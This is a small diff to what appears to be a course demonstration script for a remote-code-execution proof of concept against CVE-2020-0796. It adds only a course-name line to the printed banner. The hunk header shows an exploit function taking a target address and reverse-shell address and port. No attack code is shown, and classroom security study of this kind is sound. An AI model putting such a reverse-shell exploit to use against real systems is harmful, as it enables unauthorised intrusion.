@@ -878,6 +878,7 @@ def exploit(ip_address, reverse_shell_ip, reverse_shell_port):
 
 if __name__ == "__main__":
     print('CVE-2020-0796 Remote Code Execution POC')
+    print('ICT519 Computer Security')
     print('Demostration by Abdullah')
     print('')
 
